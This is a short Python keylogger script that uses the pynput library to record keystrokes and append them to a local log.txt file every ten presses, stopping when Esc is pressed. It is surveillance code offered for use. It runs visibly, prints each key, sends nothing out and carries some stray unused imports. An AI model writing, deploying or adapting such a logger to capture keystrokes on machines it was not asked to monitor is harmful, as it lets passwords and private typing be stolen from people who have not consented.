from curses import has_key
from os.path import isabs
from warnings import onceregistry

import pynput

from pynput.keyboard import Key, Listener

# Count works as an Auto Saver
count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# Storing the logged keys in a file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            # Altering text file
            k = str(key).replace("'", "")
            # If we find [spacebar] we replace
            if k.find("space") > 0:
                f.write('[]')
            # If key doesn't exist write it
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
